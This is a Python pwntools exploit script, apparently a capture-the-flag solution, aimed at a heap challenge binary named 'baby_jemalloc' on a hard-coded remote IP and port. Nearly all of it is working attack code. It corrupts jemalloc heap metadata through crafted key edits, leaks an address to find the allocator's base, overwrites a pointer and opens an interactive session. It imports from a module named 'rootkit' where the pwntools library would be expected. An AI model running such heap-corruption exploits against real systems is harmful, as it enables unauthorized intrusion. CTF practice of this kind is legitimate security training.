#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-

from rootkit import *
import os
import monkeyhex
import time

# Set up pwntools for the correct architecture
exe  = context.binary = ELF('./baby_jemalloc')
host = args.HOST or '138.68.147.151'
port = int(args.PORT or 30955)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def alloc(user, pswd, pdata, key):
  io.sendlineafter(b'choice: ',b'1')
  io.sendafter(b'username: ',user)
  io.sendafter(b'password: ',pswd)
  io.sendafter(b'data: ',pdata)
  io.sendafter(b'data: ',key)

def editUser(idx, pwdLen, paswd):
  io.sendlineafter(b'choice: ',b'2')
  io.sendlineafter(b'username: ',str(idx))
  io.sendlineafter(b'size of your password: ',str(pwdLen))
  io.sendlineafter(b'Enter the password: ',paswd)

def editKey(idx, paswd, key):
  io.sendlineafter(b'choice: ',b'7')
  io.sendlineafter(b'key: ',str(idx))
  io.sendlineafter(b'password: ',str(len(paswd)))
  io.sendafter(b'password: ',paswd)
  io.sendafter(b'personal key: ',key)

def free(idx,paswd):
  io.sendlineafter(b'choice: ',b'5')
  io.sendlineafter(b'delete: ',str(idx))
  io.sendlineafter(b'password: ',str(len(paswd)))
  io.sendafter(b'password: ',paswd)

def showPasswd(idx, paswd):
  io.sendlineafter(b'choice: ',b'6')
  io.sendlineafter(b'key: ',str(idx))
  io.sendlineafter(b'password: ',str(0x10))
  io.sendafter(b'password: ',paswd)
  return io.recvline()

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = start()

KEY = b'\0\0\0\0\0\0\0\0'
alloc(b'A'*0x48,b'HK\0',b'C'*0x48,KEY)
alloc(b'A'*0x48,p64(0x4141414141414141),b'C'*0x48,KEY)
alloc(b'B'*0x48,b'A'*0x48,b'C'*0x48,KEY)
alloc(b'A'*0x48,b'A'*0x48,b'C'*0x48,KEY)
editKey(0,b'HK\0',p8(0xd0 ^ 0x8)+p8(0xd1 ^ 0x70)+p8(0x0 ^ 0x1)+b'\0\0\0\0\0')
leak = u64(showPasswd(1,p64(0x303030303030303)+p64(0)).strip()[-6:]+b'\0\0')
libjemalloc_base = (( leak >> 24) << 24) + 0x930000
editKey(0, b'HK\0',
  p64( (libjemalloc_base + 0x26f010) ^ (leak-0x9e48 ^ u64(p8(0xd0 ^ 0x8)+p8(0xd1 ^ 0x70)+p8(0x0 ^ 0x1)+b'\0\0\0\0\0')) ))
print(f'Leak = {hex(leak)}')
print(f'libjemalloc @ {hex(libjemalloc_base)}')

io.interactive()
